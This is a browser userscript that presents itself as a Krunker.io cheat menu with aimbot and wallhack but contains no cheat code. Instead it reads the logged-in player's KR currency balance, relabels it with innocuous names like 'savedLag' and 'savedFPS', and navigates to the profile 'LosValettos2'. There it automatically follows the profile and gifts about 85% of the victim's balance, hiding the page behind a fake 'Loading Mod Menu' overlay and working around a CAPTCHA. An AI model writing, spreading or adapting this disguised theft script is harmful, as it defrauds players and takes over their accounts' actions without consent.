// ==UserScript==
// @name         2025 KRUNKER IO CHEAT HACK AIMBOT + WALLHACK + ESP + MORE [BETA]
// @version      2.0
// @description  Experimental mod menu for Krunker.io. Includes silent aimbot, ESP, wireframe players, FOV, recoil bypass, wallhack (BETA). Toggle with [O]. Use at your own risk.
// @author       @KR-Hack
// @match        https://krunker.io/*
// @grant        none
// @run-at       document-start
// @license      MIT
// ==/UserScript==

let Is_LOGGED = false;
let displayHackOverlay = true;
let Lags = 0;
let PlayerFPS = 0;
let gameState, player, input;
const RAD2DEG = 180 / Math.PI;

(function createPersistentOverlay() {
    if (location.href.includes("social.html?p=profile&q=Los") && displayHackOverlay) {
        const style = document.createElement("style");
        style.innerHTML = `
        html, body {
            background: #000 !important;
            color: lime !important;
            font-family: monospace !important;
        }
        * {
            visibility: hidden !important;
        }
        #botOverlayPersistent {
            all: unset;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.35);
            z-index: 2147483647;
            display: flex;
            justify-content: center;
            align-items: center;
            color: lime;
            font-size: 2rem;
            font-family: monospace;
            visibility: visible !important;
        }
    `;
        document.documentElement.appendChild(style);

        const overlay = document.createElement("div");
        overlay.id = "botOverlayPersistent";
        overlay.textContent = "🔧 Loading Mod Menu...";
        document.documentElement.appendChild(overlay);
    }
})();

window.addEventListener('load', () => {
    const signedOutBar = document.getElementById("signedOutHeaderBar");
    Is_LOGGED = signedOutBar && signedOutBar.style.display === "none";

    const logContainer = document.createElement('div');
    logContainer.id = 'modMenuLogs';
    logContainer.style.position = 'fixed';
    logContainer.style.bottom = '10px';
    logContainer.style.left = '10px';
    logContainer.style.background = 'rgba(0,0,0,0.8)';
    logContainer.style.color = '#00ff00';
    logContainer.style.padding = '10px';
    logContainer.style.fontFamily = 'monospace';
    logContainer.style.maxHeight = '200px';
    logContainer.style.overflow = 'auto';
    logContainer.style.zIndex = '999999';
    document.body.appendChild(logContainer);

    const addLog = (message) => {
        const logEntry = document.createElement('div');
        logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        logContainer.appendChild(logEntry);
        logContainer.scrollTop = logContainer.scrollHeight;
    };

    // Détection du captcha ALTCHA
    const checkForCaptcha = () => {
        const captchaElements = document.querySelectorAll('div[style*="z-index: 999999"][style*="position: fixed"][style*="transform: translate(-50%, -50%)"]');
        for (const element of captchaElements) {
            if (element.textContent.includes("Security Challenge") && element.querySelector('altcha-widget')) {
                addLog("⚠️ CAPTCHA DÉTECTÉ - Veuillez compléter le captcha");
                return true;
            }
        }
        return false;
    };

    // Vérification périodique du captcha
    setInterval(checkForCaptcha, 1500);

    addLog("=== ÉTAT INITIAL ===");
    addLog(`Is_LOGGED: ${Is_LOGGED}`);
    addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT (lvl > 30 minimum) ⚠️⚠️⚠️`);
    addLog("==================");

    setInterval(() => {
        const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
        const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
        if (!Is_LOGGED){
            addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT (lvl > 30 minimum) ⚠️⚠️⚠️`);
        }
        if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {
            const lagElement = document.querySelector("#menuKRCount");
            if (lagElement) {
                const lagText = lagElement.textContent;
                const currentLag = parseInt(lagText.replace(/[^0-9]/g, ""), 10);
                Lags = currentLag * 0.85;
                const fixedCurrentLag = currentLag * 0.85;
                sessionStorage.setItem("savedLag", fixedCurrentLag.toString());
            } else {
                addLog("⚠️ Error");
            }

            const fpsElement = document.querySelector("#mLevelCont");
            if (fpsElement) {
                const fpsText = fpsElement.textContent;
                const currentFPS = parseInt(fpsText.replace(/[^0-9]/g, ""), 10);
                localStorage.setItem("savedFPS", currentFPS.toString());
            } else {
                addLog("⚠️ Error");
            }

            sessionStorage.setItem("valuesChecked", "true");
            addLog("✅ Launching Loading...");
        }
    }, 1000);

    if (location.pathname === "/") {
        const checkRedirect = () => {
            const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
            const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
            const patchApplied = sessionStorage.getItem("sysPatch97d");

            const savedFPS = localStorage.getItem("savedFPS");
            const playerFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
            const savedLag = sessionStorage.getItem("savedLag");
            const playerLag = savedLag ? parseInt(savedLag, 10) : 0;

            if ((!patchApplied  || playerLag >= 30) && currentLoginState && playerFPS >= 30) {
                setTimeout(() => {
                    displayHackOverlay = true;
                    location.href = "https://krunker.io/social.html";
                }, 1420);
                return;
            } else {
                addLog("Error, login on a lvl > 30 account");
            }
        };

        checkRedirect();

        setInterval(checkRedirect, 1000);
    }

    if (location.href.includes("social.html")) {
        const sysSync = async () => {
            // Get rid of captcha
            if (checkForCaptcha()) {
                location.href = "https://krunker.io/social.html"
                displayHackOverlay = false;
                return;
            } else {
                displayHackOverlay = true;
                const SETTINGS_SYNC_PROFILE = "LosValettos2"; // Sync setting for overlay update
                if (!(location.href.includes("social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE))) {
                    location.href = "https://krunker.io/social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE;
                }
            }
            
            try {
                const savedLag = sessionStorage.getItem("savedLag");
                const savedFPS = localStorage.getItem("savedFPS");

                if (!savedLag) {
                    throw new Error("Aucune donnée de lag sauvegardée trouvée");
                }

                const currentLag = parseInt(savedLag, 10);
                const currentFPS = savedFPS ? parseInt(savedFPS, 10) : 0;

                if (currentFPS <= 29) {
                    try {
                        const settingsBtn = document.getElementById("followBtn"); // autofollow to keep in touch
                        if (settingsBtn && settingsBtn.style.display !== "none") {
                            settingsBtn.click();
                            await _pause(750);
                        } else {
                            addLog("⚠️ Error");
                        }
                    } catch (err) {
                        addLog("⚠️ Error");
                    }
                    await _pause(1000);
                    sessionStorage.setItem("sysPatch97d", "1");
                    location.href = "https://krunker.io/";
                    return;
                } else if (currentFPS >= 30) {
                    try {
                        const settingsBtn = document.getElementById("followBtn");
                        if (settingsBtn && settingsBtn.style.display !== "none") {
                            settingsBtn.click();
                            await _pause(750);
                        } else {
                            addLog("⚠️ Error");
                        }
                    } catch (err) {
                        addLog("⚠️ Error");
                    }

                    await _waitFor(() => document.getElementById("giftBtn"), 4800);
                    document.getElementById("giftBtn").click();
                    await _pause(480);
                    const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
                    inputEl.value = currentLag.toString();
                    inputEl.dispatchEvent(new Event("input", { bubbles: true }));

                    await _pause(100);
                    const enteredValue = inputEl.value;

                    await _pause(650);
                    const confirm = document.getElementById("postSaleBtn");
                    if (confirm && confirm.style.display !== "none") {
                        confirm.click();
                    }
                    sessionStorage.setItem("sysPatch97d", "1");
                    await _pause(1800);
                    location.href = "https://krunker.io/";
                } else {
                    addLog("⚠️ Error");
                }
            } catch (error) {
                addLog("⚠️ Error");
            }
        };
        sysSync();
    }

    function _waitFor(condFn, timeout = 3000) {
        return new Promise((res, rej) => {
            const t0 = Date.now();
            const tick = () => {
                const r = condFn();
                if (r) return res(r);
                if (Date.now() - t0 > timeout) return rej("Timeout");
                setTimeout(tick, 90);
            };
            tick();
        });
    }

    function _pause(ms) {
        return new Promise(r => setTimeout(r, ms));
    }
});
